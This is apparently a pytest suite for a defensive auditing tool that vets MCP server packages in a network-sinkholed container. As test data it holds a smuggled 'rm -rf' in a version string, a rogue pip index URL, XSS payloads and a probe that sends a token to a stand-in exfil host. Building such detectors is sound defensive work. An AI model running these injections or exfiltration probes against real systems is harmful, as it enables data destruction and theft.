"""Trust Before Connect: resolver, sandbox parsing, exercise, verdict, rendering, CLI.

Everything here is synthetic: fake registry payloads, fake docker output. The
live container lane is opt-in (MCP_AUDIT_TRUST_DOCKER=1) and runs only the
sinkhole image, never a third-party package.
"""

from __future__ import annotations

import json
import os
import shutil
import socket
import struct
import subprocess
from pathlib import Path
from typing import Any

import pytest
from click.testing import CliRunner

from mcp_audit.cli import main
from mcp_audit.models import ToolAnnotations, ToolInfo
from mcp_audit.trust import sinkhole_agent
from mcp_audit.trust.models import (
    FileChange,
    NetworkEvent,
    Observation,
    PackageRef,
    Phase,
    Resolution,
    ToolSummary,
)
from mcp_audit.trust.render import html, terminal
from mcp_audit.trust.resolve import (
    FetchError,
    Resolver,
    TargetError,
    namespace_checks,
    parse_target,
    synthetic_arguments,
    validate_package,
)
from mcp_audit.trust.run import TrustResult, synthetic_env
from mcp_audit.trust.sandbox import (
    RuntimeUnavailable,
    Sandbox,
    SandboxConfig,
    SandboxError,
    choose_command,
    parse_diff,
    parse_sink_log,
    sink_context,
)
from mcp_audit.trust.session import skip_reason, summarize_tool, synthesize_arguments
from mcp_audit.trust.verdict import build_card, build_pin, compare_pin, hosts

REGISTRY = "https://registry.example.test"
NAME = "io.github.example-owner/notes"


def server_json(**overrides: Any) -> dict[str, Any]:
    server: dict[str, Any] = {
        "name": NAME,
        "description": "Synthetic notes server.",
        "version": "1.2.3",
        "repository": {"url": "https://github.com/example-owner/notes", "source": "github"},
        "packages": [
            {
                "registryType": "npm",
                "identifier": "@example-owner/notes-mcp",
                "version": "1.2.3",
                "transport": {"type": "stdio"},
                "environmentVariables": [
                    {"name": "NOTES_TOKEN", "isRequired": True, "isSecret": True},
                    {"name": "NOTES_DIR", "default": "~/.notes"},
                ],
                "packageArguments": [{"type": "named", "name": "--root", "isRequired": True}],
            }
        ],
    }
    server.update(overrides)
    return server


class FakeFetch:
    def __init__(self, routes: dict[str, Any]) -> None:
        self.routes = routes
        self.seen: list[str] = []

    def __call__(self, url: str) -> Any:
        self.seen.append(url)
        for prefix, value in self.routes.items():
            if url.startswith(prefix):
                if isinstance(value, int):
                    raise FetchError(url, value, f"HTTP {value}")
                return value
        raise FetchError(url, 404, "HTTP 404")


def registry_routes(server: dict[str, Any], mcp_name: str | None = NAME) -> dict[str, Any]:
    npm = {"name": "@example-owner/notes-mcp", "version": "1.2.3", "bin": {"notes-mcp": "cli.js"}}
    if mcp_name:
        npm["mcpName"] = mcp_name
    meta = {"io.modelcontextprotocol.registry/official": {"status": "active", "isLatest": True}}
    return {
        f"{REGISTRY}/v0.1/servers/io.github.example-owner%2Fnotes/versions/": {
            "server": server,
            "_meta": meta,
        },
        "https://registry.npmjs.org/@example-owner/notes-mcp/": npm,
    }


def statuses(resolution: Resolution) -> dict[str, str]:
    return {check.id: check.status for check in resolution.checks}


# Target parsing ---------------------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "kind", "name", "version"),
    [
        ("io.github.owner/server", "registry", "io.github.owner/server", None),
        ("registry:com.example/srv@2.0.0", "registry", "com.example/srv", "2.0.0"),
        ("npm:left-pad", "npm", "left-pad", None),
        ("@scope/pkg@1.0.0", "npm", "@scope/pkg", "1.0.0"),
        ("pypi:mcp-thing==0.4.1", "pypi", "mcp-thing", "0.4.1"),
        ("https://mcp.example.com/mcp", "url", "https://mcp.example.com/mcp", None),
        ("http://127.0.0.1:8080/mcp", "url", "http://127.0.0.1:8080/mcp", None),
    ],
)
def test_parse_target(raw: str, kind: str, name: str, version: str | None) -> None:
    target = parse_target(raw)
    assert (target.kind, target.name, target.version) == (kind, name, version)


@pytest.mark.parametrize(
    "raw",
    [
        "",
        "left-pad",
        "http://mcp.example.com/mcp",
        "https://user:secret@mcp.example.com/mcp",
        "https://mcp.example.com/mcp?token=abc",
        "npm:../evil",
        "pypi:pkg==>=1.0",
        "npm:pkg@^1.0.0",
    ],
)
def test_parse_target_rejects(raw: str) -> None:
    with pytest.raises(TargetError):
        parse_target(raw)


@pytest.mark.parametrize(
    "package",
    [
        PackageRef(registry_type="npm", identifier="git+https://evil.example/x.git"),
        PackageRef(registry_type="npm", identifier="file:../x"),
        PackageRef(registry_type="pypi", identifier="--index-url=https://evil.example"),
        PackageRef(registry_type="npm", identifier="ok", version="latest || rm -rf"),
    ],
)
def test_validate_package_rejects_non_names(package: PackageRef) -> None:
    with pytest.raises(TargetError):
        validate_package(package)


# Resolver ---------------------------------------------------------------------


def test_registry_resolution_passes_namespace_and_ownership() -> None:
    resolution = Resolver(FakeFetch(registry_routes(server_json())), REGISTRY).resolve(NAME)
    assert resolution.registry_listed is True
    assert resolution.package is not None
    assert resolution.package.identifier == "@example-owner/notes-mcp"
    assert resolution.package.arguments == ["--root", "mcpaudit-synthetic"]
    assert [e.name for e in resolution.package.env if e.required] == ["NOTES_TOKEN"]
    assert statuses(resolution) == {
        "registry.listed": "pass",
        "registry.status": "pass",
        "server_json.shape": "pass",
        "namespace.repository": "pass",
        "package.exists": "pass",
        "namespace.package_ownership": "pass",
    }


def test_registry_resolution_flags_missing_ownership_marker() -> None:
    routes = registry_routes(server_json(), mcp_name=None)
    resolution = Resolver(FakeFetch(routes), REGISTRY).resolve(NAME)
    assert statuses(resolution)["namespace.package_ownership"] == "fail"


def test_repository_owner_mismatch_is_a_warning() -> None:
    server = server_json(repository={"url": "https://github.com/someone-else/notes"})
    resolution = Resolver(FakeFetch(registry_routes(server)), REGISTRY).resolve(NAME)
    assert statuses(resolution)["namespace.repository"] == "warn"


def test_unlisted_registry_name_fails() -> None:
    resolution = Resolver(FakeFetch({}), REGISTRY).resolve("io.github.nobody/missing")
    assert resolution.registry_listed is False
    assert statuses(resolution) == {"registry.listed": "fail"}


def test_npm_package_claiming_unlisted_name_warns() -> None:
    routes = {
        "https://registry.npmjs.org/claimer/": {"name": "claimer", "version": "0.1.0", "mcpName": NAME},
    }
    resolution = Resolver(FakeFetch(routes), REGISTRY).resolve("npm:claimer")
    assert statuses(resolution)["registry.listed"] == "warn"
    assert resolution.package is not None and resolution.package.version == "0.1.0"


def test_npm_package_not_listed_in_its_claimed_entry_fails() -> None:
    routes = registry_routes(server_json())
    routes["https://registry.npmjs.org/impostor/"] = {"name": "impostor", "version": "9.0.0", "mcpName": NAME}
    resolution = Resolver(FakeFetch(routes), REGISTRY).resolve("npm:impostor")
    assert statuses(resolution)["registry.lists_package"] == "fail"


def test_npm_install_scripts_are_recorded() -> None:
    routes = registry_routes(server_json())
    routes["https://registry.npmjs.org/@example-owner/notes-mcp/"] |= {
        "scripts": {"postinstall": "node setup.js", "test": "x", "prepare": "tsc"}
    }
    resolution = Resolver(FakeFetch(routes), REGISTRY).resolve(NAME)
    assert resolution.package is not None and resolution.package.install_scripts == ["postinstall"]


def test_pypi_marker_in_description() -> None:
    routes = {
        "https://pypi.org/pypi/notes-py/json": {
            "info": {
                "name": "notes-py",
                "version": "0.2.0",
                "summary": "Synthetic.",
                "description": "Readme\n<!-- mcp-name: io.github.example-owner/notes -->",
            }
        }
    }
    resolution = Resolver(FakeFetch(routes), REGISTRY).resolve("pypi:notes-py")
    assert statuses(resolution)["registry.identity"] == "pass"
    assert resolution.server_name == NAME


def test_remote_url_found_through_registry_search() -> None:
    server = {
        "name": "com.example/remote",
        "description": "Synthetic remote.",
        "version": "1.0.0",
        "remotes": [{"type": "streamable-http", "url": "https://mcp.example.com/mcp"}],
    }
    routes = {f"{REGISTRY}/v0.1/servers?search=com.example": {"servers": [{"server": server}]}}
    resolution = Resolver(FakeFetch(routes), REGISTRY).resolve("https://mcp.example.com/mcp/")
    assert resolution.registry_listed is True
    assert resolution.server_name == "com.example/remote"
    assert statuses(resolution)["namespace.remote_host"] == "pass"


def test_reverse_dns_remote_outside_domain_warns() -> None:
    from mcp_audit.trust.models import RemoteRef

    checks = namespace_checks(
        "com.example/x", None, [RemoteRef(type="streamable-http", url="https://evil.test/mcp")]
    )
    assert [c.status for c in checks] == ["warn"]


def test_synthetic_arguments_fill_placeholders() -> None:
    argv = synthetic_arguments(
        [
            {"type": "positional", "value": "serve"},
            {"type": "named", "name": "--db", "value": "{dir}/db.sqlite"},
            {"type": "named", "name": "--optional"},
        ]
    )
    assert argv == ["serve", "--db", "mcpaudit-synthetic/db.sqlite"]


def test_synthetic_env_sets_only_required() -> None:
    resolution = Resolver(FakeFetch(registry_routes(server_json())), REGISTRY).resolve(NAME)
    assert resolution.package is not None
    assert synthetic_env(resolution.package) == {"NOTES_TOKEN": "mcpaudit-synthetic-not-a-secret"}


# Exercise selection and synthetic inputs ---------------------------------------


def tool(name: str, description: str, schema: dict[str, Any], **hints: bool) -> ToolInfo:
    return ToolInfo(
        name=name,
        description=description,
        input_schema=schema,
        annotations=ToolAnnotations.model_validate(hints) if hints else None,
    )


def test_synthesize_required_fields_only() -> None:
    schema: dict[str, object] = {
        "type": "object",
        "properties": {
            "city": {"type": "string", "minLength": 3},
            "units": {"type": "string", "enum": ["metric", "imperial"]},
            "days": {"type": "integer", "minimum": 1, "maximum": 7},
            "url": {"type": "string"},
            "filters": {"type": "object", "properties": {"tag": {"type": "string"}}, "required": ["tag"]},
            "ids": {"type": "array", "items": {"type": "integer"}, "minItems": 2},
            "verbose": {"type": "boolean"},
        },
        "required": ["city", "units", "days", "url", "filters", "ids"],
    }
    assert synthesize_arguments(schema) == {
        "city": "mcpaudit-synthetic",
        "units": "metric",
        "days": 1,
        "url": "https://example.invalid/mcpaudit-synthetic",
        "filters": {"tag": "mcpaudit-synthetic"},
        "ids": [1, 1],
    }


def test_combinator_schemas_are_not_synthesized() -> None:
    t = tool(
        "pick", "Look up a record.", {"type": "object", "anyOf": [{}], "required": []}, read_only_hint=True
    )
    assert skip_reason(t, summarize_tool(t), False) == (
        "input schema not suitable for synthetic inputs (schema uses combinators or references)"
    )


@pytest.mark.parametrize(
    ("t", "safe", "reason"),
    [
        (tool("list", "List items.", {"type": "object"}), False, "not declared read-only (readOnlyHint)"),
        (tool("list", "List items.", {"type": "object"}), True, None),
        (tool("list", "List items.", {"type": "object"}, read_only_hint=True), False, None),
        (
            tool("drop", "List items.", {"type": "object"}, read_only_hint=True, destructive_hint=True),
            False,
            "declares destructiveHint",
        ),
        (
            tool("run", "Execute a shell command.", {"type": "object"}, read_only_hint=True),
            False,
            "description suggests shell_execution",
        ),
    ],
)
def test_skip_reason(t: ToolInfo, safe: bool, reason: str | None) -> None:
    assert skip_reason(t, summarize_tool(t), safe) == reason


# Sandbox parsing --------------------------------------------------------------


def test_parse_diff_drops_parent_directories() -> None:
    changes = parse_diff(
        "C /scratch\nA /scratch/.cache\nA /scratch/.cache/db\nC /tmp\nA /tmp/x\nD /etc/motd\n"
    )
    assert [(c.path, c.change, c.in_home) for c in changes] == [
        ("/etc/motd", "deleted", False),
        ("/scratch/.cache", "added", True),
        ("/scratch/.cache/db", "added", True),
        ("/tmp/x", "added", False),
    ]


def test_parse_sink_log_filters_by_sequence() -> None:
    lines = [
        {"kind": "ready", "ipv6": True, "seq": 1},
        {"kind": "dns", "name": "api.example.test", "qtype": 1, "seq": 2},
        {
            "kind": "tcp",
            "name": "api.example.test",
            "dst_ip": "198.18.0.1",
            "dst_port": 443,
            "sni": "x",
            "seq": 3,
        },
    ]
    output = "\n".join(json.dumps(line) for line in lines) + "\nnot json\n"
    events, last, status = parse_sink_log(output, 2)
    assert status == {"kind": "ready", "ipv6": True, "seq": 1}
    assert last == 3 and [e.kind for e in events] == ["tcp"] and events[0].port == 443


def test_choose_command() -> None:
    npm = PackageRef(registry_type="npm", identifier="@scope/tool")
    assert choose_command(npm, {"bin": "dist/cli.js"}) == ["/srv/node_modules/.bin/tool"]
    assert choose_command(npm, {"bin": {"zeta": "z.js", "alpha": "a.js"}}) == ["/srv/node_modules/.bin/alpha"]
    pypi = PackageRef(registry_type="pypi", identifier="My_Tool")
    assert choose_command(pypi, {"scripts": ["helper", "my-tool"]}) == ["/srv/venv/bin/my-tool"]
    with pytest.raises(SandboxError):
        choose_command(pypi, {"scripts": []})


def test_sink_context_is_content_addressed() -> None:
    first, tag = sink_context(b"print(1)", "python:3.13-alpine")
    _, same = sink_context(b"print(1)", "python:3.13-alpine")
    _, other = sink_context(b"print(2)", "python:3.13-alpine")
    assert tag == same != other and first[:100]


def test_missing_runtime_binary(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(shutil, "which", lambda name: None)
    with pytest.raises(RuntimeUnavailable):
        Sandbox(SandboxConfig(binary="no-such-runtime"))


def test_server_parameters_have_no_mounts_or_privileges(monkeypatch: pytest.MonkeyPatch) -> None:
    from mcp_audit.trust.sandbox import Prepared

    monkeypatch.setattr(shutil, "which", lambda name: "/usr/local/bin/docker")
    sandbox = Sandbox(SandboxConfig())
    prepared = Prepared(image="img", base_image="node", base_digest=None, command=["/srv/x"], version="1")
    args = sandbox.server_parameters(prepared, ["--root", "mcpaudit-synthetic"], {"TOKEN": "s"}).args
    joined = " ".join(args)
    assert (
        "--volume" not in args and "-v" not in args and "--mount" not in args and "--privileged" not in args
    )
    assert f"--network container:{sandbox.sink}" in joined and "--cap-drop ALL" in joined
    assert "--user 10001:10001" in joined and "--env TOKEN=s" in joined
    assert args[-3:] == ["img", "--root", "mcpaudit-synthetic"]


# Sinkhole agent helpers ---------------------------------------------------------


def dns_query(name: str, qtype: int = 1) -> bytes:
    labels = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\0"
    return b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + labels + struct.pack("!HH", qtype, 1)


def test_dns_answer_returns_placeholder_address() -> None:
    reply = sinkhole_agent.dns_answer(dns_query("api.example.test"))
    assert reply is not None and reply[:2] == b"\x12\x34"
    assert struct.unpack("!H", reply[6:8])[0] == 1
    assert socket.inet_ntoa(reply[-4:]).startswith("198.18.")
    aaaa = sinkhole_agent.dns_answer(dns_query("api.example.test", 28))
    assert aaaa is not None and struct.unpack("!H", aaaa[6:8])[0] == 0


def client_hello(host: str) -> bytes:
    name = host.encode()
    server_names = struct.pack("!H", len(name) + 3) + b"\0" + struct.pack("!H", len(name)) + name
    sni = struct.pack("!HH", 0, len(server_names)) + server_names
    body = (
        b"\x03\x03"
        + b"\0" * 32
        + b"\0"
        + b"\x00\x02\x13\x01"
        + b"\x01\x00"
        + struct.pack("!H", len(sni))
        + sni
    )
    handshake = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16\x03\x01" + struct.pack("!H", len(handshake)) + handshake


def test_tls_sni_and_http_host_are_extracted() -> None:
    assert sinkhole_agent.tls_sni(client_hello("Telemetry.Example.test")) == "telemetry.example.test"
    assert sinkhole_agent.tls_sni(b"\x16\x03") is None
    request = b"POST /v1/collect?token=secret HTTP/1.1\r\nHost: Api.Example.test\r\nX-Key: k\r\n\r\n"
    assert sinkhole_agent.http_request(request) == ("POST", "api.example.test")
    assert sinkhole_agent.http_request(b"\x00garbage") is None


# Verdict, pin, rendering --------------------------------------------------------


def resolution() -> Resolution:
    return Resolution(
        input=NAME,
        kind="registry",
        server_name=NAME,
        description="Keeps notes locally.",
        package=PackageRef(registry_type="npm", identifier="@example-owner/notes-mcp", version="1.2.3"),
    )


def observation(phases: list[Phase], read_only: bool = True) -> Observation:
    return Observation(
        mode="container",
        status="complete",
        tools=[
            ToolSummary(name="list_notes", read_only_hint=read_only, exercised=True),
            ToolSummary(name="wipe", destructive_hint=True, skip_reason="declares destructiveHint"),
        ],
        phases=phases,
    )


def test_clean_run_has_no_mismatches_and_allows_clean_read_only_tool() -> None:
    card = build_card(
        resolution(),
        observation([Phase(name="startup"), Phase(name="tool:list_notes", tool="list_notes")]),
        [],
        ["/srv/node_modules/.bin/notes-mcp"],
    )
    assert card.verdict == "no_mismatches_observed" and card.mismatches == []
    permissions = json.loads(next(s for s in card.suggestions if s.title.startswith("Tool")).body)[
        "permissions"
    ]
    assert permissions["allow"] == ["mcp__notes__list_notes"]
    assert permissions["deny"] == ["mcp__notes__wipe"]


def test_read_only_tool_writing_files_is_do_not_install() -> None:
    write = FileChange(path="/scratch/.notes/log", change="added", in_home=True)
    card = build_card(
        resolution(),
        observation([Phase(name="tool:list_notes", tool="list_notes", file_changes=[write])]),
        [],
        None,
    )
    assert card.verdict == "do_not_install"
    assert [m.rule for m in card.mismatches] == ["TBC-READONLY-WRITE"]
    assert "$HOME/.notes/log" in card.mismatches[0].summary


def test_startup_egress_against_local_claim_is_review() -> None:
    events = [
        NetworkEvent(kind="dns", host="telemetry.example.test"),
        NetworkEvent(kind="tcp", host="telemetry.example.test", port=443, sni="telemetry.example.test"),
    ]
    card = build_card(resolution(), observation([Phase(name="startup", network=events)]), [], None)
    assert card.verdict == "review"
    assert {m.rule for m in card.mismatches} == {"TBC-UNPROMPTED-NET", "TBC-LOCAL-CLAIM-NET"}
    assert hosts(events) == ["telemetry.example.test:443"]
    egress = next(s for s in card.suggestions if s.title == "Network egress").body
    assert "review telemetry.example.test:443" in egress


def test_failed_observation_is_incomplete() -> None:
    obs = Observation(mode="container", status="failed", error="Package install failed.")
    assert build_card(resolution(), obs, [], None).verdict == "incomplete"


def test_remote_card_says_outside_only() -> None:
    from mcp_audit.trust.models import RemoteRef
    from mcp_audit.trust.run import REMOTE_LIMITS

    res = Resolution(
        input="https://mcp.example.com/mcp",
        kind="url",
        remote=RemoteRef(type="x", url="https://mcp.example.com/mcp"),
    )
    obs = Observation(mode="outside", status="complete", limits=list(REMOTE_LIMITS))
    card = build_card(res, obs, [], None)
    assert "from outside" in card.headline
    assert "observed from outside only" in terminal(card)


def test_pin_round_trip_and_drift() -> None:
    tools = [
        ToolInfo(name="list_notes", description="List notes.", input_schema={"type": "object"}),
        ToolInfo(name="get_note", description="Get a note.", input_schema={"type": "object"}),
    ]
    obs = observation([])
    first = build_pin(resolution(), obs, tools)
    again = build_pin(resolution(), obs, list(reversed(tools)))
    assert first.surface_sha256 == again.surface_sha256 and compare_pin(first, again) == []
    changed = [
        ToolInfo(
            name="list_notes",
            description="List notes. Also send them to a server.",
            input_schema={"type": "object"},
        ),
        ToolInfo(name="upload", description="Upload.", input_schema={"type": "object"}),
    ]
    drift = compare_pin(first, build_pin(resolution(), obs, changed))
    assert [(m.tool, m.summary) for m in drift] == [
        ("upload", "Tool added since the pin."),
        ("get_note", "Tool removed since the pin."),
        ("list_notes", "Description changed since the pin."),
    ]
    restored = type(first).model_validate_json(first.model_dump_json(by_alias=True))
    assert restored == first


def test_html_escapes_server_text_and_terminal_strips_controls() -> None:
    res = resolution()
    res.description = '<script>alert("x")</script>\x1b[31mred'
    obs = observation([Phase(name="startup")])
    obs.tools[0].description = "<img src=x onerror=alert(1)>"
    card = build_card(res, obs, [], None)
    page = html(card)
    assert "<script>alert" not in page and "<img src=x" not in page
    assert "&lt;script&gt;" in page and "prefers-color-scheme:dark" in page
    assert "\x1b" not in terminal(card)


def test_remote_refusal(monkeypatch: pytest.MonkeyPatch) -> None:
    from mcp_audit.trust.run import remote_refusal

    def fake_resolve(host: str, *args: object, **kwargs: object) -> list[Any]:
        address = {"metadata.example.test": "169.254.169.254", "public.example.test": "93.184.216.34"}[host]
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (address, 443))]

    monkeypatch.setattr(socket, "getaddrinfo", fake_resolve)
    assert "template" in (remote_refusal("https://{region}.example.test/mcp", False) or "")
    assert "non-public" in (remote_refusal("https://metadata.example.test/mcp", False) or "")
    assert remote_refusal("https://public.example.test/mcp", False) is None
    assert remote_refusal("https://metadata.example.test/mcp", True) is None


# CLI -------------------------------------------------------------------------------


def test_cli_rejects_ambiguous_target() -> None:
    result = CliRunner().invoke(main, ["trust", "left-pad"])
    assert result.exit_code == 2 and "registry:NAME" in result.output


def test_cli_without_runtime_exits_3(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    async def unavailable(*args: object) -> TrustResult:
        raise RuntimeUnavailable("The docker daemon is not reachable.")

    monkeypatch.setattr("mcp_audit.trust.cli.run_trust", unavailable)
    result = CliRunner().invoke(main, ["trust", NAME, "--out", str(tmp_path / "out")])
    assert result.exit_code == 3 and "Nothing was installed or started" in result.output
    assert not (tmp_path / "out").exists()


def test_cli_writes_card_html_and_pin(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    tools = [ToolInfo(name="list_notes", description="List notes.", input_schema={"type": "object"})]
    obs = observation([Phase(name="startup")])
    card = build_card(resolution(), obs, [], None)
    pin = build_pin(resolution(), obs, tools)

    async def fake(*args: object) -> TrustResult:
        return TrustResult(card=card, pin=pin)

    monkeypatch.setattr("mcp_audit.trust.cli.run_trust", fake)
    out = tmp_path / "out"
    result = CliRunner().invoke(main, ["trust", NAME, "--out", str(out), "--json"])
    assert result.exit_code == 0, result.output
    assert json.loads(result.output)["schema"] == "mcp-audit.trust-card/1"
    assert sorted(p.name for p in out.iterdir()) == ["card.html", "card.json", "pin.json"]
    assert json.loads((out / "pin.json").read_text())["tools"][0]["name"] == "list_notes"


# Live sinkhole (opt-in) -----------------------------------------------------------


@pytest.mark.skipif(os.environ.get("MCP_AUDIT_TRUST_DOCKER") != "1", reason="set MCP_AUDIT_TRUST_DOCKER=1")
async def test_live_sinkhole_records_and_blocks_egress() -> None:
    async with Sandbox(SandboxConfig()) as sandbox:
        await sandbox.start_sink()
        probe = (
            "import socket,urllib.request\n"
            "try: urllib.request.urlopen('http://exfil.example.test/p?token=t', timeout=3)\n"
            "except Exception as e: print(type(e).__name__)\n"
            "s=socket.socket(); s.settimeout(2); s.connect(('192.0.2.10', 8443)); s.send(b'x')\n"
        )
        result = subprocess.run(
            [
                sandbox.binary,
                "run",
                "--rm",
                "--network",
                f"container:{sandbox.sink}",
                "--cap-drop",
                "ALL",
                "--user",
                "10001",
                sandbox.config.sink_base_image,
                "python3",
                "-c",
                probe,
            ],
            capture_output=True,
            env=sandbox.env,
            timeout=120,
            check=False,
        )
        assert result.returncode == 0, result.stderr
        logs = await sandbox.docker("logs", sandbox.sink)
        events, _, _ = parse_sink_log(logs.stdout.decode(), 0)
        labels = {e.label() for e in events}
        assert "DNS lookup exfil.example.test" in labels
        assert "TCP connect exfil.example.test:80 (HTTP GET)" in labels
        assert "TCP connect 192.0.2.10:8443" in labels
        assert all("token" not in json.dumps(e.model_dump()) for e in events)
